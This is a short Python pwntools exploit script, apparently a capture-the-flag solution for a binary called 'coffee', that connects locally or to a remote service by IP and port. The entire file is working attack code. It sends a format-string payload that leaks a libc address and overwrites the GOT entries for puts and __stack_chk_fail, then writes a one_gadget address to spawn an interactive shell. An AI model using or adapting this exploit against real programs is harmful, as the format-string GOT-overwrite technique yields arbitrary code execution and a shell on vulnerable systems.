#!/usr/bin/env python3
from pwn import *

if len(sys.argv) == 1:
    s = process('./coffee')
else:
    s = remote('34.146.101.4', 30002)

elf = ELF('./coffee')

payload = b'%29$pAAA'
payload += '%{}x%14$hn'.format(0x121a - 17).encode()
payload += '%{}x%15$hn'.format(0xbb00 - 0x121a).encode()
payload += '%{}x%16$hhn'.format(0x11).encode()
payload += '%{}x'.format(elf.got['puts'] - 0xbb11).encode()
payload = payload.ljust(0x40, b'\0')
payload += p64(elf.got['puts'])
payload += p64(elf.got['__stack_chk_fail'] - 1)
payload += p64(elf.got['__stack_chk_fail'] + 1)
s.sendline(payload)

libc_base = int(s.recv(14), 0x10) - 0x270b3
log.info('libc base: %#x' % libc_base)

one_gadget = 0xe6c81
s.sendline(p64(libc_base + one_gadget))
s.interactive()
